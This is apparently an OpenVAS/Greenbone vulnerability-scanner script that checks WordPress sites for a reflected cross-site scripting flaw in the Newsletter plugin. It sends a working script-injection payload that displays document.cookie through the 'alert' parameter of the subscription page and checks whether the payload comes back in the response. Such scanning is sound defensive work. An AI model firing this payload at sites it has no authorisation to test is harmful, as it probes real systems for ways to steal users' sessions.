CPE = "cpe:/a:wordpress:wordpress";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.803493" );
	script_version( "2020-02-26T12:57:19+0000" );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:P/I:N/A:N" );
	script_tag( name: "last_modification", value: "2020-02-26 12:57:19 +0000 (Wed, 26 Feb 2020)" );
	script_tag( name: "creation_date", value: "2013-05-16 15:45:07 +0530 (Thu, 16 May 2013)" );
	script_name( "WordPress NewsLetter Plugin Cross Site Scripting Vulnerability" );
	script_xref( name: "URL", value: "http://secunia.com/advisories/53398" );
	script_xref( name: "URL", value: "http://cxsecurity.com/issue/WLB-2013050125" );
	script_xref( name: "URL", value: "http://packetstormsecurity.com/files/121634" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_copyright( "Copyright (C) 2013 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "secpod_wordpress_detect_900182.sc" );
	script_mandatory_keys( "wordpress/installed" );
	script_require_ports( "Services/www", 80 );
	script_tag( name: "impact", value: "Successful exploitation will allow remote attackers to insert arbitrary HTML
  and script code, which will be executed in a user's browser session in the
  context of an affected site." );
	script_tag( name: "affected", value: "WordPress Newsletter Plugin 3.2.6 and prior" );
	script_tag( name: "insight", value: "The input passed via 'alert' parameters to
  '/wp-content/plugins/newsletter/subscription/page.php' script is
  not properly sanitised before being returned to the user." );
	script_tag( name: "solution", value: "Update to WordPress Newsletter Plugin version 3.2.7 or later." );
	script_tag( name: "summary", value: "This host is running WordPress with NewsLetter plugin and is
  prone to cross site scripting vulnerability." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_xref( name: "URL", value: "http://wordpress.org/extend/plugins/newsletter" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
url = dir + "/wp-content/plugins/newsletter/subscription/page.php" + "?alert=</script><script>alert(document.cookie)</script>";
if(http_vuln_check( port: port, url: url, check_header: TRUE, pattern: "<script>alert\\(document\\.cookie\\)</script>", extra_check: "newsletter-" )){
	security_message( port );
	exit( 0 );
}

